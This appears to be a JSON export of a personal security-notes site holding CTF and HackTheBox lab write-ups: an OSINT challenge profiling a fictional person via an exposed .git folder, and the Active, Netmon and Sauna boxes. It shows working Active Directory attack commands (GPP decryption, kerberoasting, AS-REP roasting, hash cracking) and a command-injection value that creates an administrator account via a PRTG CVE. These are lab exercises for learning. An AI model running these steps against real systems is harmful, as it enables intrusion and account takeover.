{"/":{"title":"SecNotes","content":"\n## Writeups\n- [HackTheBox](HackTheBox.md)\n- [CTFs](CTFs/ctfs.md)\n\n## Notes\n- [Notes \u0026 bits](Notes/Notes.md)\n","lastmodified":"2023-08-21T11:55:44.171435159Z","tags":null},"/CTFs/2023/PWNME_2023/OSINT/OSINT":{"title":"OSINT - PWNME 2023","content":"\n# OSINT Challenges PWNME 2023 edition\n\nThis osint challenge consisted of a single scenario scattered in multiple (5) sections where we had to gather information about a person: *John Droper* \n\n\u003e Note : It was indicated to us that any *John Droper* related content found during the CTF was valid if it was created before the start of the CTF (5/5/2023)  and somewhat after April 2023.\n\n## Social Media Goes Brrrrr\n\n![](CTFs/2023/PWNME_2023/OSINT/assets/Pasted%20image%2020230508185947.png)\n\nOur first task was to find *John Droper* main social media along with his account. This was quite simple in fact, we simply had to search for profiles with the name *John Droper* and it turned out that Facebook was is main social media.\nLooking inside the `About` tab of his profile we can gather multiple information in addition to the first flag !\n\n![](CTFs/2023/PWNME_2023/OSINT/assets/Pasted%20image%2020230508192047.png)\n\n![](CTFs/2023/PWNME_2023/OSINT/assets/Pasted%20image%2020230508192203.png)\n\nWe know that:\n- *John* has a nickname: **jdthetraveller**, this will be usefull when searching for other website accounts\n- He owns his own public website\n- *John* loves trains and trips\n- Has a relation with an infamous French social website *jeuxvideo.com* since he's friends with *Modération 18-25* which is a sub category of the forum !\n\n### *John Droper*s post on Facebook\n\n*2 march, 23:34*\n\u003e Mon pseudo était disponible avec l'AFNIC je l'ai pris il y a un moment mais avec mes voyages je n'ai plus le temps de m'en occuper et je suis un très mauvais développeur qui configure tout très mal...\n\u003e Eng translation: My nickname was available at AFNIC (French Network Information Center). I purchased it a while ago but I'm lacking time to take care of it and I'm a very bad developer who setup everything badly.\n\nHere we get more precisions about his website. Since it's registered to the AFNIC, we can assume that his website follows this pattern `jdthetraveller[.fr|.re|.yt|.tf|.pm|.wf]`.\n*We'll find out later that his personal website is hosted at https://jdthetraveller.fr*\n\n*4 may*, 19:27\n\u003e Même quand je suis chez moi (ce qui arrive rarement avec mes voyages) je ne peux plus aller dans mon bar préféré, ma charmante ex est toujours la directrice du bar. Impossible d'y retourner sans me faire virer par le videur.\n\u003e Eng translation: I can't even go to my favorite bar when i'm home, which is rare since i travel a lot. My ex is still the bar owner. I can't go back to it without me getting thrown out by the bouncer\n\nWith this post we learn that he was previously in a relationship with the owner of his favorite bar and that he's in bad terms with her / the bar.\n\n*10 april, 21:35*\n\u003e Ça y est j'ai enfin sauté le pas ! Je viens de m'inscrire et je me suis présenté sur mon nouveau forum préféré !\n\u003e Je parlerai sûrement de mes voyages plus tard (vous connaissez tous ma passion pour les voyages)\n\u003e Eng translation: Finally made it ! I just registered and presented myself to my new favorite forum !\n\u003e I'll surely talk about my trips later (y'all know my passion for trips)\n\nIt appears that *John* has an account to a train / trip related website but we still don't know which one.\n\n\u003e `PWNME{TG9uZyBsaXZlIHRoZSB0cmFpbnMsIGxvbmcgbGl2}`\n\n## Newbie Dev\n\n![](CTFs/2023/PWNME_2023/OSINT/assets/Pasted%20image%2020230508194804.png)\n\nAfter getting a hit on a common guess that his personal blog address would be https://jdthetraveller.fr, we discover that his blog mentions a *previous VERSION* of his curriculum vitae\n![](CTFs/2023/PWNME_2023/OSINT/assets/Pasted%20image%2020230508195056.png)\n\nOn this website we also learn that he as 2 other social media account that we did not find in the first place, and that his personal email address is probably a gmail address, this will be important for the last part of the challenge.\n\nOne common idea that goes out when thinking about misconfiguration and versioning is leaving the `.git` folder of a web project accessible to anyone. This is the case here, we get a clear result when we append `/.git/` to the base url.\n\n![](CTFs/2023/PWNME_2023/OSINT/assets/Pasted%20image%2020230508195726.png)\n\nUsing a tool like `gitdumper` allows us to retrieve all the content of this `.git` directory\n```\nexegol-PWNME osint # gitdumper https://jdthetraveller.fr/.git/ dest-dir website_dir\n###########\n# GitDumper is part of https://github.com/internetwache/GitTools\n#\n# Developed and maintained by @gehaxelt from @internetwache\n#\n# Use at your own risk. Usage might be illegal in certain circumstances.\n# Only for educational purposes!\n###########\n\n[*] Destination folder does not exist\n[+] Creating dest-dir/.git/\n[+] Downloaded: HEAD\n[-] Downloaded: objects/info/packs\n[+] Downloaded: description\n[+] Downloaded: config\n[-] Downloaded: COMMIT_EDITMSG\n[+] Downloaded: index\n[+] Downloaded: packed-refs\n[-] Downloaded: refs/heads/master\n[+] Downloaded: refs/remotes/origin/HEAD\n[-] Downloaded: refs/stash\n[-] Downloaded: logs/HEAD\n[-] Downloaded: logs/refs/heads/master\n[-] Downloaded: logs/refs/remotes/origin/HEAD\n[-] Downloaded: info/refs\n[+] Downloaded: info/exclude\n[-] Downloaded: /refs/wip/index/refs/heads/master\n[-] Downloaded: /refs/wip/wtree/refs/heads/master\n[+] Downloaded: objects/82/a509883e0961c418caafed1ca897efb0806528\n[+] Downloaded: objects/d6/4257d03047138d87259b871cc9a38d61c8eaf9\n[+] Downloaded: objects/29/add3b306ac1717fad680d0c4053a4e5b1bd733\n[+] Downloaded: objects/7c/2c6ff75206ee6f13d457b4a0a560c88645a927\n[+] Downloaded: objects/96/088d6bb6191f378aa09f134cad08576d2aeab5\n[+] Downloaded: objects/6a/73c112ca4b08cc41dd29851397e0c851f041ad\n[+] Downloaded: objects/6b/69ca508f11024499a726ae407757bfb56fb222\n[+] Downloaded: objects/88/59cf13df516dedd96b837a8561cd3ac68e29b1\n[+] Downloaded: objects/c9/56a966e04e28ddec8adb161ad0411b83b672dc\n[+] Downloaded: objects/5b/68083ee07fa71c83336dd61120346025a8b42f\n[+] Downloaded: objects/6b/512acb863c20286cea4ecdb15ed3153c202122\n[+] Downloaded: objects/53/dc29ad327213f480eb9ced9c3a815ca197da5e\n[+] Downloaded: objects/37/8ef96aa13a462001f0cef1a60e2ac2528effb6\n[+] Downloaded: objects/02/2075ab206a0f9c9b120cebe27833a5973385c2\n[+] Downloaded: objects/94/8a91e3156492ebcaadf5cf2b51e097cd6e72d5\n```\n\nAll we have to do now is just  to `cd` into the `dest-dir` directory, checkout the `main` branch and restore its contents (since we don't have them on our machine)\n\n```\nexegol-HTB dest-dir # git checkout main\nD       e3t4euO8T-267oIAQAu6jDQyK3nVivM.woff2\nD       facebook.png\nD       index.html\nD       instagram.png\nD       twitter.png\nBranch 'main' set up to track remote branch 'main' from 'origin'.\nAlready on 'main'\nYour branch is up to date with 'origin/main'.\nexegol-HTB dest-dir # git restore .\nexegol-HTB dest-dir # ls\ne3t4euO8T-267oIAQAu6jDQyK3nVivM.woff2  facebook.png  index.html  instagram.png  twitter.png\n```\n\nUpon inspecting the commit history we discover that *John* removed some personal data, if we checkout the `main` branch before this commit we'll be able to see that\n```\nexegol-HTB dest-dir # git checkout 5b68083ee07fa71c83336dd61120346025a8b42f\n...\n\ncommit 29add3b306ac1717fad680d0c4053a4e5b1bd733\nAuthor: droperkingjohn \u003c131888528+droperkingjohn@users.noreply.github.com\u003e\nDate:   Wed Apr 26 16:24:42 2023 +0200\n\n    I already give enough info on my social media\n\n    You see I'm aware of OPSec... I'm deleting my personal data...\n\ncommit 5b68083ee07fa71c83336dd61120346025a8b42f\nAuthor: droperkingjohn \u003c131888528+droperkingjohn@users.noreply.github.com\u003e\nDate:   Wed Apr 26 16:22:03 2023 +0200\n\n    Real First commit with all my life\n```\n\n```html\nexegol-HTB dest-dir # cat index.html\n\u003cbody\u003e\n        \u003ch1\u003eJohn Droper's website\u003c/h1\u003e\n        \u003cbr\u003e\n        \u003cbr\u003e\n        \u003cp\u003eI will edit my curriculum later but this is some informations about me :\u003c/p\u003e \u003cbr\u003e\n        \u003cp\u003e- I could be pro with my team but you know... (cruciate ligament rupture...) =\u003e https://www.tgb-basket.com/\u003cbr\u003e- If you've already met me, you know that I love travelling, this is one of my new favorite forum (i'm not really active but recently I shared informations about my trip in Europe) =\u003e  https://www.forum-train.com/forum/index.php\u003c/p\u003e\n\n        \u003chr style = \"border:none;margin-bottom:20%\"\u003e\n        \u003cp class=\"semiSecret\"\u003eYou can contact me :\u003cbr\u003ejohndroperdroperjohn@gmail.com\u003cbr\u003e(links are not up for the moment sorry...)\u003c/p\u003e\n        \u003cdiv class=\"logosRS\"\u003e\n                \u003cimg src=\"./twitter.png\" sizes=\"30px\"/\u003e\n                \u003cimg src=\"./facebook.png\"/\u003e\n                \u003cimg src=\"./instagram.png\"/\u003e\n    \u003c!-- No copyright but =\u003e https://github.com/droperkingjohn --\u003e\n        \u003c/div\u003e\n\u003c/body\u003e\n```\n\nWe got tons of new info about *John Droper* to process:\n\n- We get a new alias for John: `droperkingjohn` \n- A gmail address: johndroperdroperjohn@gmail.com\n- *John*s github profile https://github.com/droperkingjohn\n- The forum that he mentioned previously in his Facebook post\n- The fact that he likes the *Tarbes Gespe Bigorre - TGB - female Basketball club*\n\nBrowsing *John*s github profile, we find the repository used to host his website source code\n![](CTFs/2023/PWNME_2023/OSINT/assets/Pasted%20image%2020230508211611.png)\n\nWe can see that one commit contains one comment, which itself contains the flag for the second part !\n![](CTFs/2023/PWNME_2023/OSINT/assets/Pasted%20image%2020230508211938.png)\n\n\u003e `PWNME{W0w_th15_l00k_l1ke_4n_e4sY_Fl4G}`\n\n## French Dream\n\n⚠️ WIP - Writeup in progress ⚠️\n\n## Europe\n\n⚠️ WIP - Writeup in progress ⚠️","lastmodified":"2023-08-21T11:55:44.163434947Z","tags":null},"/CTFs/2023/PWNME_2023/PWNME-2023":{"title":"PWNME 2023","content":"\n\u003e PWNME 2023 is the 2023 edition of a CTF made by the French cybersecurity school [Ecole 2600](https://ecole2600.com). It was a good CTF with interesting challenges and a large cash prize even though there were some issues with the CTF web infrastructure.\n\u003e My team *Skill Issue 🐒* ranked 31 over 754 team 💪\n\n# WRITEUPS\n\u003e Some writeups I made along with the team\n\n\n## [OSINT](CTFs/2023/PWNME_2023/OSINT/OSINT.md)","lastmodified":"2023-08-21T11:55:44.167435053Z","tags":null},"/CTFs/ctfs":{"title":"SecNotes - CTFs","content":"\n\u003e The list of CTF writeups that I did in a team or solo\n\n## 2023\n\n- [PWNME 2023](\u003cCTFs/2023/PWNME_2023/PWNME 2023.md\u003e)","lastmodified":"2023-08-21T11:55:44.167435053Z","tags":null},"/HTB/Easy/Active/Active":{"title":"HTB - Active","content":"\nActive is an easy HTB box that allows anonymous login on its SMB share. In one of the shares we can access the configuration file of a GPP (Group Policy Preference). We will then use those creds to kerberoast the domain and impersonate the domain admin.\n\n```\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\n| dns-nsid: \n|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\n9389/tcp  open  mc-nmf        .NET Message Framing\n49152/tcp open  msrpc         Microsoft Windows RPC\n49153/tcp open  msrpc         Microsoft Windows RPC\n49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49158/tcp open  msrpc         Microsoft Windows RPC\n49165/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2023-02-10T14:23:26\n|_  start_date: 2023-02-10T14:17:08\n| smb2-security-mode: \n|   210: \n|_    Message signing enabled and required\n```\n\n## ZEROLOGON CVE test\n\nThe domain name is `active.htb` and the domain seems to be vulnerable to zerologon CVE\n```\ncme smb 10.10.10.100 -M zerologon                                                                                                                                                                                                   \nSMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)\nZEROLOGO... 10.10.10.100    445    DC               VULNERABLE\nZEROLOGO... 10.10.10.100    445    DC               Next step: https://github.com/dirkjanm/CVE-2020-1472\n```\n\nHowever the vulnerability only allows us to reset the password of a computer account. It seems that this box doesn't have any !\n\n## Enumerating SMB share\n\n\n```\nsmbmap -H active.htb                                                                                                                                                                                                               \n[+] IP: active.htb:445\tName: unknown                                           \n    Disk                                                Permissions\tComment\n\t----                                                -----------\t-------\n\tReplication                                       \tREAD ONLY\n```\n\nIn the `Replication` share we can access a `Groups.xml` file in the `\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml` directory\n\n```xml\ncat active.htb\\\\Policies\\\\\\{31B2F340-016D-11D2-945F-00C04FB984F9\\}\\\\MACHINE\\\\Preferences\\\\Groups\\\\Groups.xml | xq\n\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e\n\u003cGroups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"\u003e\n  \u003cUser clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"active.htb\\SVC_TGS\" image=\"2\" changed=\"2018-07-18 20:46:06\" uid=\"{EF57DA28-5F69-4530-A59E-AAB58578219D}\"\u003e\n    \u003cProperties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"active.htb\\SVC_TGS\"/\u003e\n  \u003c/User\u003e\n\u003c/Groups\u003e\n```\n\n## Decrypting Group Policy Preference password\n\nwe have a user: `active.htb\\SVC_TGS` and an hashed password: `edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`\nSince this is a groups policy configuration file, we can use a tool like `gpp-decrypt` to decrypt the password\n\n```\nSVC_TGS:edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ:GPPstillStandingStrong2k18                                                                                                                          \n```\n\n## Kerberoasting the domain\n\nLooking to the SPNs of the `SVC_TGS` user we can see that it as the Administrator service attached to it and request the hash\n```\nimpacket-GetUserSPNs active.htb/svc_tgs:GPPstillStandingStrong2k18                                                                                                                                                                  \nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\nServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation \n--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------\nactive/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-02-10 09:18:10.370542\n\n[-] CCache file is not found. Skipping...\n$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$3441b65bc2247e4f8a03cf9177a9e76f$97d5ec5ec9153d5ef4ce61654640a3117556642864b84b6e8890a5275cfbc96b9ed53bce558cbb7e3210f3ec81403cc99a1092650963addecf32e42e01ac1cc72d6154cd1cdd47aa62129928a54861778858d0e9bb7a3a967070b6a98b17fd6b852914a9841867fd886e413d03c6b10299a5c2f8c04cf69665d001325e6475d1bf73538e4feee22f5d509036689d79b8427fb30e6b6cbe596d27003909a8937c1aa66fd842ba6d3e2aeb214cdec9f1f307c91947e378cba475df9a4d3d6b029fcb3ee52cf7b3d88a2a7e110df9bd614a361a6907fb17a18bdf80d007c2559fe97d7106c3785508a862f85920870474436db5384954ac3fa52506ec7aa208fc642d8df96fcfefcd41759f8d201af21a66a31424fdd6a3c85c5eb8e58698bebc6f48d3c8156108b26edded0e25028395088bdafbed9e0679f7f3a5c2105f0a30340c7361ea0c17d85cd1a9323a866eed20dacb1cea66e63725b33c5ecf698db6a13764fcd51680e79a7a4ddfa2025e6158408de61656fa89c1f5bb652ba8e88396878cf04a8ec6f8c2d85590c510d4c109a4435b621d56725e3489bd85c72efdcae1361b4f6f29464516310ceb9c43d85504803cdb98d66a7a83436de8fee9c285ff44bdf6a865c436a4b4c01cebba30caa25dad6bfc8341a488710284ff520e59f07e32e2bd81b3ddc310ea64073551850c0c5c79ff2b01811f56abd6830380aa47991e7cedccb8458306ef390b191a74141f25f4156602434c84a6d1e5de882d8a4580e7777592c0af00368be88cd294a1828d14b04078268857efd37d878e1df2e7882e430937c868ee3c235c64ce0c0518b23daaf50524262d7af8374c1d7d13ff275aaeb2d4f5da5a2dff1fcc25d8ed86d968a8476143ac663ac9008521be501bc61de25e92af693da9f4fc31dac84b50f2c08787ca0b0211afdbccb6bc2a02e20b344cf15b8c29ba8d046c018af0ee23535554c2e7cdddac6edd8e702d157a5178b2915fb037ffa5c02c77ac807f1e32df8a718d9f4b5bbcbde619100e9234cc17fedb040159fe3bcf50cf7ebe36892530b6eddd6a1b0a995f5b5952b9713acfd85a2628f23b0ac4286376f55aa16aaabb6a5fe6c84428f30e1bfbada41150cb04d6667311c6ed76ecae77f31ac481fe1d57d6926977ab655c3fac85ba29b4ca1d43c206bcbe471a1b99261ab73a115336b4dada808fabc04be2485281fcc4f19518c55277759de7a2c2b9de6771bd6ae75793d790f711b9\n```\n\nUsing JTR we can crack the hash of the SPN\n```\nrick svc_tgs.txt -w /usr/share/wordlists/rockyou.txt                                                                                                                                                                               \n...\nTicketmaster1968 (?)     \n1g 0:00:00:11 DONE (2023-02-10 11:18) 0.09049g/s 953663p/s 953663c/s 953663C/s Tiffani1432..Thrash1\n...\n```\n\nWe can now the `User` smb share as Administrator and get both the user and the root flag\n\n```\nsmbclient -U ACTIVE/Administrator \\\\\\\\10.10.10.100\\\\Users\n...\nsmb: \\SVC_TGS\\Desktop\\\u003e get user.txt\ngetting file \\SVC_TGS\\Desktop\\user.txt of size 34 as user.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)\nsmb: \\Administrator\\Desktop\\\u003e root user.txt\ngetting file \\Administrator\\Desktop\\root.txt of size 34 as root.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)\n```\n\n\nAAAAAAAAAAAAAAAA","lastmodified":"2023-08-21T11:55:44.167435053Z","tags":null},"/HTB/Easy/Easy":{"title":"HTB - Easy","content":"\n## Easy HTB boxes\n- [Active](HTB/Easy/Active/Active.md)\n- [Sauna](HTB/Easy/Sauna/Sauna.md)\n- [Netmon](HTB/Easy/Netmon/Netmon.md)\n- [Timelapse](HTB/Easy/Timelapse/Timelapse.md)","lastmodified":"2023-08-21T11:55:44.167435053Z","tags":null},"/HTB/Easy/Netmon/Netmon":{"title":"HTB - Netmon","content":"\nNetmon is an easy windows box on HTB that allows anonymous FTP access to the `C:\\` drive and have an out of date, CVE vunlerable Paessler PRTG Network Monitor (Netmon) that runs as SYSTEM.\n\n```\nPORT      STATE SERVICE      VERSION\n21/tcp    open  ftp          Microsoft ftpd\n| ftp-syst: \n|_  SYST: Windows_NT\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| 02-02-19  11:18PM                 1024 .rnd\n| 02-25-19  09:15PM       \u003cDIR\u003e          inetpub\n| 07-16-16  08:18AM       \u003cDIR\u003e          PerfLogs\n| 02-25-19  09:56PM       \u003cDIR\u003e          Program Files\n| 02-02-19  11:28PM       \u003cDIR\u003e          Program Files (x86)\n| 02-03-19  07:08AM       \u003cDIR\u003e          Users\n|_02-25-19  10:49PM       \u003cDIR\u003e          Windows\n80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)\n|_http-server-header: PRTG/18.1.37.13946\n|_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479\n| http-title: Welcome | PRTG Network Monitor (NETMON)\n|_Requested resource was /index.htm\n|_http-trane-info: Problem with XML parsing of /evox/about\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc        Microsoft Windows RPC\n49665/tcp open  msrpc        Microsoft Windows RPC\n49666/tcp open  msrpc        Microsoft Windows RPC\n49667/tcp open  msrpc        Microsoft Windows RPC\n49668/tcp open  msrpc        Microsoft Windows RPC\n49669/tcp open  msrpc        Microsoft Windows RPC\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   311: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2023-02-06T23:46:50\n|_  start_date: 2023-02-06T23:31:49\n| smb-security-mode: \n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n```\n\nSince anonymous user access is allowed, we can use it and connect ourselves to the machine. \n\nWe get the user flag in the  `Users/Public`\n\nWith ftp we can access \n\n```\nlftp 10.10.10.152:/ProgramData/Paessler/PRTG Network Monitor\u003e ls\n02-06-23  07:13PM       \u003cDIR\u003e          Configuration Auto-Backups\n02-06-23  07:00PM       \u003cDIR\u003e          Log Database\n02-02-19  11:18PM       \u003cDIR\u003e          Logs (Debug)\n02-02-19  11:18PM       \u003cDIR\u003e          Logs (Sensors)\n02-02-19  11:18PM       \u003cDIR\u003e          Logs (System)\n02-07-23  12:00AM       \u003cDIR\u003e          Logs (Web Server)\n02-06-23  07:01PM       \u003cDIR\u003e          Monitoring Database\n02-25-19  09:54PM              1189697 PRTG Configuration.dat\n02-25-19  09:54PM              1189697 PRTG Configuration.old\n07-14-18  02:13AM              1153755 PRTG Configuration.old.bak\n02-07-23  03:37AM              1726351 PRTG Graph Data Cache.dat\n02-25-19  10:00PM       \u003cDIR\u003e          Report PDFs\n02-02-19  11:18PM       \u003cDIR\u003e          System Information Database\n02-02-19  11:40PM       \u003cDIR\u003e          Ticket Database\n02-02-19  11:18PM       \u003cDIR\u003e          ToDo Database\n```\n\nin the `PRTG Configuration.old.bak` we find a password\n```xml\n\u003cdbpassword\u003e\n\t\u003c!-- User: prtgadmin --\u003e\n\tPrTg@dmin2018\n\u003c/dbpassword\u003e\n```\n\nSince it's an old file we can try to use `PrTg@dmin2019`\n\n## Remote access as SYSTEM using  CVE-2018-9276\n\nWe can gain admin access using an  RCE on a vulnerable version of PRTG Network Monitor \n\n1. Create a new notification inside Setup \u003e Account Settings \u003e Notifications\n2. Select Execute Program and enter `azer.txt;net user bob bob /add;net localgroup administrators bob /add`\n\nAfter waiting a bit we can access the SMB with full access\n\n```\nsmbmap -H 10.10.10.152 -u bob -p \"bob\"\n[+] Finding open SMB ports....\n[+] User SMB session established on 10.10.10.152...\n[+] IP: 10.10.10.152:445 Name: 10.10.10.152\nDisk    Permissions\n----    ----------- \nADMIN$  READ, WRITE\nC$      READ, WRITE\nIPC$    READ ONLY\n```\n\nwe can use `psexec.py` to get a shell and access the root file\n\n\nAAAAAAAAAAAAAAAA","lastmodified":"2023-08-21T11:55:44.167435053Z","tags":null},"/HTB/Easy/Sauna/Sauna":{"title":"HTB - Sauna","content":"\n\u003e Sauna is an easy HTB windows machine involving real world user guessing, improper Active Directory configuration such as no pre-authentication enabled, misconfigured service accounts and password reuse.\n\u003e Overall a fun and easy box that goes over basic windows pentesting !\n\n\n```\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n| http-methods: \n|   Supported Methods: OPTIONS TRACE GET HEAD POST\n|_  Potentially risky methods: TRACE\n|_http-title: Egotistical Bank :: Home\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-12 01:53:29Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49674/tcp open  msrpc         Microsoft Windows RPC\n49677/tcp open  msrpc         Microsoft Windows RPC\n49689/tcp open  msrpc         Microsoft Windows RPC\n49696/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: 7h00m00s\n| smb2-time: \n|   date: 2023-02-12T01:54:21\n|_  start_date: N/A\n| smb2-security-mode: \n|   311: \n|_    Message signing enabled and required\n```\n\n\u003e The domain name is `EGOTISTICAL-BANK.LOCAL0`\n\nSMB Anonymous login is enabled but no share is available\n\n```\n❯ smbclient -L \\\\\\\\10.10.10.175\\\\                                                                                                                                                                                                     17:12:07\nPassword for [WORKGROUP\\kali]:\nAnonymous login successful\n\n\tSharename       Type      Comment\n\t---------       ----      -------\nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.10.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\nLdapsearch doesn't give us any useful info.\n\n## Webserver enumeration\n\nWhile searching for attack vectors for this box, I remembered the recent 'Absolute' windows box. The foothold in this box was about user enumeration on the AD using metadata in picture files.\nNavigating to the `/about.html` page, we can see multiple names that could be users on the AD.\n\nLet's use username-anarchy to generate some password based on their first and last name\n\n```\n❯ /home/kali/username-anarchy/username-anarchy -i usernames_website.txt \u003e password_gen_website.txt\n```\n\nWe can then validate if there is a corresponding valid user on the domain using kerbrute\n\n```\n❯ /home/kali/kerbrute_linux_amd64 userenum --dc 10.10.10.175 --domain EGOTISTICAL-BANK.LOCAL password_gen_website.txt\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,\u003c /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: v1.0.3 (9dad6e1) - 02/14/23 - Ronnie Flathers @ropnop\n\n2023/02/14 04:59:52 \u003e  Using KDC(s):\n2023/02/14 04:59:52 \u003e  \t10.10.10.175:88\n\n2023/02/14 04:59:52 \u003e  [+] VALID USERNAME:\t fsmith@EGOTISTICAL-BANK.LOCAL\n2023/02/14 04:59:53 \u003e  Done! Tested 88 usernames (1 valid) in 0.283 seconds\n```\n\nMaybe this user doesn't require pre-authentication, let's check.\n\n```\n❯ impacket-GetNPUsers -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/fsmith -request -no-pass\n[*] Getting TGT for fsmith\n$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:3bf74079ee6a27450228115c24f9fa7a$f5486977edb41a40f9231517f657bdf5571066747d1f878d28cebcb951e3b7089b5cd561d83a4716cd33f87b919c4a982c3953c9e9de84965d8e5b58fab761c324b9c037a5402bc6232325997551f80398b9bbb7a90c88018f3ee463afbd1cdaeb1ca7ef5db4821d6e593b384882fb074cec17d8ef18b013fdf50d73d98cd44c52fe624c1978c305560c72c294ed2b31b18663794a43df584e4442d2ee93fb8c89b608afb75603f1c8fdcc3fe77fcb1e236ce8419e444c4bf08740440cb2d6611e0e3d5da75d2c62e83a72c324ab73787812fb11fabb45fd598f28a199ce6bce8ce3ebb2ec189ca00b49f4754dcc65a285aefc6099d1a9495a038af251940e02\n```\nIt doesn't, we get a Ticket Granting Ticket (TGT) for fsmith. We can then use JTR to crack the hash\n\n```\n❯  rick fsmith_tgt.txt /usr/share/wordlists/rockyou.txt       \n...\nThestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)\n...\n```\n\nWe can then access the box using evil-winrm and access the user flag in `C:\\Users\\FSmith\\Desktop\\user.txt`\n\n```\n❯ evil-winrm -i 10.10.10.175 -u 'fsmith'  -p 'Thestrokes23'                                                                                                                                                                           ...\n*Evil-WinRM* PS C:\\Users\\FSmith\\Documents\u003e\n```\n\nUsing winPEAS we can see that there is some credentials left for us:\n```\nLooking for AutoLogon credentials\n    Some AutoLogon credentials were found\n    DefaultDomainName             :  EGOTISTICALBANK\n    DefaultUserName               :  EGOTISTICALBANK\\svc_loanmanager\n    DefaultPassword               :  Moneymakestheworldgoround!\n```\n\nThose are svc_loanmanager credentials, howerver upon inspecting `C:\\Users\\` we can see that they logged in as `svc_loanmgr`\n\n```\nDirectory: C:\\Users\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ 